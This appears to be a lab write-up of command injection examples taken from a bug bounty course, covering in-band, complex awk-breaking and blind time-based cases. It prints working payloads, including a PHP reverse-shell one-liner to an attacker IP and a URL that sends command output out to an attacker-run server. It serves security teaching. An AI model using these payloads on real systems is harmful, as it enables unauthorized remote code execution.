---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Examples

## In Band

{% hint style="success" %}
**In-Band CI** occurs when the attacker can directly insert and execute malicious commands in a web application or systemâ€™s input fields or parameters, using the same channel to both send commands and receive outputs.
{% endhint %}

### Simple Payload

> _The example below is based on TCM's_ [_Practical Bug Bounty_](https://academy.tcm-sec.com/p/practical-bug-bounty) _course._

The application takes our input and passes it into a `curl` command which is then `grep`ped (Figure 1.1). We can start simple by just appending a command using `;`, but this gives no output (Figure 1.2). Next, we can try commenting out the `grep` part by using `#` (Figure 1.3).

<figure><img src="../../../../.gitbook/assets/web_ci_basic_1.png" alt=""><figcaption><p>Figure 1: A basic example of a command injection attack.</p></figcaption></figure>

We can also try to achieve RCE[^1] by first checking what technology is used on the application and then getting a payload from a repository such as [PayloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#php) (Figure 2).

{% code overflow="wrap" %}
```bash
;php -r '$sock=fsockopen("172.31.150.94",9999);exec("/bin/sh -i <&3 >&3 2>&3");'#
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/web_ci_basic_2.png" alt=""><figcaption><p>Figure 2: Achieving RCE.</p></figcaption></figure>

### Complex Payload

> _The example below is based on TCM's_ [_Practical Bug Bounty_](https://academy.tcm-sec.com/p/practical-bug-bounty) _course._

The application we need to test tracks the fleet vehicle's coordinates and calculates the distance between its current position and its destination (Figure 3).

<figure><img src="../../../../.gitbook/assets/web_ci_chall_lab_1.png" alt=""><figcaption><p>Figure 3: Undestanding the application's functionality.</p></figcaption></figure>

We have two fields that are directly inputted within the executed command. We can start by trying to manipulate the second field first (Figure 4).

```bash
# original command
awk 'BEGIN {print sqrt(((-111)^2) + ((-222)^2))}'

# our goal command
awk 'BEGIN {print sqrt(((-111)^2) + ((-222)^2))}';whoami;#

# the payload
222)^2))}';whoami;#

# the final command
awk 'BEGIN {print sqrt(((-111)^2) + ((-222)^2))}';whoami;#)^2))}'
```

<figure><img src="../../../../.gitbook/assets/web_ci_chall_lab_2.png" alt=""><figcaption><p>Figure 4: Executing a successful CI attack.</p></figcaption></figure>

We can achieve RCE with the same logic using the [previously used payload](examples.md#basic) (Figure 5).

{% code overflow="wrap" %}
```bash
222)^2))}';php -r '$sock=fsockopen("172.31.150.94",9999);exec("/bin/sh -i <&3 >&3 2>&3");';#
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/web_ci_chall_lab_3.png" alt=""><figcaption><p>Figure 5: Achieving RCE via a CI vulnerability.</p></figcaption></figure>

## Blind

{% hint style="success" %}
**Blind CI** occurs when the attacker does not see the output of the injected commands directly. Instead, they infer the success or failure of the commands through side effects or indirect responses.
{% endhint %}

> _The example below is based on TCM's_ [_Practical Bug Bounty_](https://academy.tcm-sec.com/p/practical-bug-bounty) _course._

This time we have the same Network Checker app, but the [previous attack](examples.md#basic) does not work (Figure 6.1). Either something gets filtered, which we can check (Figure 6.2 & 6.3), or we the command is executed but we don't get any output on the front-end.

<figure><img src="../../../../.gitbook/assets/web_ci_blind_1.png" alt=""><figcaption><p>Figure 6: An unsuccessful CI attack.</p></figcaption></figure>

We can try a payload that alters the application's behaviour (similar to [Blind SQLi](../sqli/blind.md)) and see if this works. This can be tested with Burp Suite's Repeater, as it shows the response time in the bottom right corner (Figure 7).

```bash
localhost?q=`sleep 5`
```

<figure><img src="../../../../.gitbook/assets/web_ci_blind_2.png" alt=""><figcaption><p>Figure 7: Confirming a blind CI vulnerability.</p></figcaption></figure>

We also use `time` and `curl` to measure the response time within the CLI.

```bash
$ time curl "http://localhost?q=localhost"
<html>
<SNIP>
</html>

real    0m0.062s # Normal response time
user    0m0.006s
sys     0m0.000s

$ time curl "http://localhost?q=`sleep+5`"
<html>
<SNIP>
</html>

real    0m5.063s # The 'sleep 5' payload worked
user    0m0.003s
sys     0m0.003s
```

Next, we can achieve RCE[^2] by spawning up a web server and passing the desired command as a parameter (Figure 8).

```bash
http://172.31.150.94:9999/?q=`whoami`
```

<figure><img src="../../../../.gitbook/assets/web_ci_blind_3.png" alt=""><figcaption><p>Figure 8: Achieving RCE via a blind CI vulnerability.</p></figcaption></figure>

[^1]: Remote Code Execution

[^2]: Remote Code Execution
